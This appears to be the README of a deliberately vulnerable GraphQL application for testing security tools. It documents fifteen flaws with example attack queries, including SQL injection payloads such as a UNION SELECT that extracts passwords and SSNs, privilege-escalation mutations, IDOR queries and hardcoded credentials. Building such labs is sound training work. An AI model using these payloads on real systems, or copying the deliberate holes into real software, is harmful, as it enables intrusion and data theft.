# Vulnerable GraphQL Application

Deliberately vulnerable GraphQL API for testing security tools. Built with Python FastAPI, Strawberry GraphQL, PostgreSQL, and vanilla JavaScript frontend.

## Setup

```bash
docker-compose up --build
```

Access:

- Frontend: http://vuln.feys-it.com:8003
- GraphQL API: http://vuln.feys-it.com:8004/graphql
- GraphiQL: http://vuln.feys-it.com:8004/graphql

Database: admin/password123

## API

### Queries (12)

user, users, userByUsername, post, posts, comments, product, products, order, orders, messages, searchUsers

### Mutations (12)

createUser, updateUser, deleteUser, createPost, updatePost, deletePost, createComment, createOrder, updateOrderStatus, sendMessage, markMessageRead

## Vulnerabilities

### 1. Information Disclosure

Passwords, SSN, and salary data exposed in user queries.

```graphql
query {
  users {
    password
    ssn
    salary
  }
}
```

### 2. No Authentication/Authorization

All queries and mutations accessible without authentication. No ownership checks.

```graphql
query {
  messages(userId: 1) {
    content
  }
}
mutation {
  deleteUser(id: 3) {
    success
  }
}
```

### 3. SQL Injection

Multiple injection points in userByUsername and searchUsers.

```graphql
query {
  userByUsername(username: "admin' OR '1'='1")
}
query {
  searchUsers(query: "%' OR '1'='1' --")
}
```

### 4. IDOR

Access any resource by ID without authorization.

```graphql
query {
  order(id: 1) {
    userId
    totalPrice
  }
}
mutation {
  updatePost(id: 2, title: "Hacked") {
    success
  }
}
```

### 5. Privilege Escalation

Create admin users or escalate existing users to admin.

```graphql
mutation {
  createUser(username: "hacker", email: "h@x.com", password: "p", role: "admin") {
    id
  }
}
mutation {
  updateUser(id: 5, role: "admin") {
    success
  }
}
```

### 6. No Rate Limiting

Unlimited requests allowed for brute force and DoS attacks.

### 7. GraphQL Introspection Enabled

Full schema discoverable via introspection queries.

```graphql
query {
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```

### 8. GraphiQL Enabled in Production

Interactive GraphQL IDE exposed at /graphql endpoint.

### 9. No Query Depth/Complexity Limiting

Can execute arbitrarily complex queries causing DoS.

### 10. Overly Permissive CORS

CORS allows all origins with credentials.

### 11. Debug Mode

Application runs with DEBUG=true exposing stack traces.

### 12. Hardcoded Credentials

Database credentials hardcoded in docker-compose.yml.

### 13. No Input Validation

Missing validation for email format, password strength, negative quantities.

### 14. Business Logic Flaws

- No stock checking on orders
- Negative order quantities accepted
- Message spoofing (send as any user)

```graphql
mutation {
  createOrder(userId: 1, productId: 1, quantity: -100) {
    success
  }
}
mutation {
  sendMessage(fromUserId: 1, toUserId: 2, content: "Fake") {
    success
  }
}
```

### 15. Returns Private/Unpublished Content

Posts with isPrivate=true and isPublished=false returned without checks.

```graphql
query {
  posts {
    isPrivate
    content
  }
}
```

## Exploitation Examples

**Extract all sensitive data:**

```graphql
query {
  users {
    id
    username
    password
    email
    ssn
    salary
    role
  }
}
```

**SQL injection data extraction:**

```graphql
query {
  userByUsername(
    username: "x' UNION SELECT id,username,email,password,role,is_active,salary::text,ssn,created_at::text FROM users--"
  )
}
```

**Privilege escalation chain:**

```graphql
mutation {
  createUser(username: "attacker", email: "a@a.com", password: "p") {
    id
  }
}
mutation {
  updateUser(id: 6, role: "admin") {
    success
  }
}
```

**Access other users' orders:**

```graphql
query {
  orders(userId: 1) {
    id
    totalPrice
    status
  }
}
```

## Cleanup

```bash
docker-compose down -v
```
